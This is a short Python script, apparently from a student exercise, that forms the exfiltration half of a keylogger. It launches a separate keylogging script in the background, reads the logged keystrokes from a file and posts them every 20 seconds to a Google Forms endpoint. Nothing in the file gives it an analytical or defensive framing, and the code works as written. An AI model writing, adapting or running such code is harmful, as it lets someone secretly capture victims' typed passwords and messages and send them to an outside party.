#!/usr/bin/env python3

import requests
import time
import os
from pynput.keyboard import Listener

startlog = time.time()

os.system("python3 /home/student/Desktop/scripts/keyloggerRemote.py &")
time.sleep(1)

def send_request():
    form_input = open("/home/student/Desktop/scripts/keyboard_Input.txt")
    form_send = form_input.read()
    url='https://docs.google.com/forms/d/e/1FAIpQLSfCRT-wxg944edJ2vAy9cAl5WhvupufTw2sGmDqP0U65EWtXw/formResponse'
    form_data = {'entry.1012171706': f"'{form_send}'"}
    r = requests.post(url, data=form_data)

def interval():
    global startlog
    if time.time() - 20 > startlog:
        print('its been 20 seconds')
        send_request()
        startlog = time.time()

counter = 0
while True:
    counter += 1
    print(counter)
    interval()
    time.sleep(1)


